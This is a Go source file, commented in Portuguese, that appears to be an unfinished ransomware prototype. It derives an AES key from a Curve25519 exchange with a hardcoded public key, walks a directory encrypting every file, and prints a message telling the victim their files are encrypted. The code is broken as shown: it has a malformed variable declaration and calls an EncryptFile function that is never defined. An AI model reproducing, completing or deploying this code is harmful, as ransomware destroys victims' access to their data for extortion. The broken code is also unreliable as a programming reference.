	package main

		import (
		  "fmt"
		  "os"
		  "path/filepath"
		  "golang.org/x/crypto/curve25519"
		  "crypto/rand"
		  "io"
		  "crypto/sha256"
		  "crypto/aes"
		  "crypto/cipher"
		)
		
	  var k [32]byte
	  var shared [32]byte
	  var pub [32]byte
	  var fol [32]string={"
	  var priv [32]byte
	  var pub2 =[32]byte{14, 54, 78 ,147, 219, 46, 173, 49, 165, 160, 248, 99, 188, 13, 95, 179, 5, 10, 26, 85, 28, 82, 38, 225, 157, 246, 167, 8 ,85, 204, 233 ,12}
		func GenerateKeyPair()([]byte){
		buffer := make([]byte, 32)
		  io.ReadFull(rand.Reader, buffer)
		  copy(priv[:], buffer)
		   curve25519.ScalarBaseMult(&pub, &priv)
		  curve25519.ScalarMult(&shared, &priv, &pub2)
		   k = sha256.Sum256([]byte(shared[:]))
		  fmt.Println("a chave e  ",pub)
		   fmt.Println("a chave privada  ",k)
		  
		  return k[:]




		}
		
	 func DecryptFile( filename string) {
	// Read the encrypted file into memory.
	ciphertext, err := os.ReadFile(filename)
	if err != nil {
		panic(err)
	}

	// Create a new AES cipher block.
	block, err := aes.NewCipher(k[:])
	if err != nil {
		panic(err)
	}

	// Create a new GCM cipher.
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}

	// Get the nonce size.
	nonceSize := aesgcm.NonceSize()
	if len(ciphertext) < nonceSize {
		panic(err)
	}

	// Decrypt the data.
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err)
	}

	// Write the decrypted data back to the file.
	if err := os.WriteFile(filename+".enc", plaintext, 0644); err != nil {
		panic(err)
	}
}
		
		
		
		


		func EnumerateFiles(root string) {
		  err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {

		   if !info.IsDir() {
			EncryptFile(path)
		   }
		   return nil
		  })
		  if err != nil {
		   fmt.Printf("Erro ao percorrer o diretório: %v\n", err)
		   return
		  } // se info.IsDir() nao for pasta e um arquivo
		}

		func EnumerateFolders(root string) {
		  err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		   if err != nil {
			//fmt.Printf("Erro ao acessar o caminho %q: %v\n", path, err")
			return err
		   }
		   if info.IsDir() {
			fmt.Println(path)

		   }else{
		   fmt.Printf("unidade de disco nao encontrada")
		   } //se info.IsDir for uma pasta passe para funçao de enumeraçao de arquivos vamos testar
		   return nil
		  })
		  if err != nil {
		   // fmt.Printf("Erro ao percorrer o diretório: %v\n", err")
		   return
		  }
		}

		func main() {
		GenerateKeyPair()
		//fmt.Println("a chave e  ",GenerateKeyPair())
		
		  EnumerateFiles("C:\\Users\\RootkitAdmin\\Desktop\\Projeto Go\\Teste")
		  fmt.Println("seus arquivos foram criptografados  guarde sua chave publica",pub)
		  //os.Create("chave.txt")
		  file, err := os.Create("chave.txt")
if err != nil {
    panic(err)
}
defer file.Close()


n, err := file.WriteAt(pub[:], 0)
fmt.Println(n)
if err != nil {
    panic(err)
}

		}
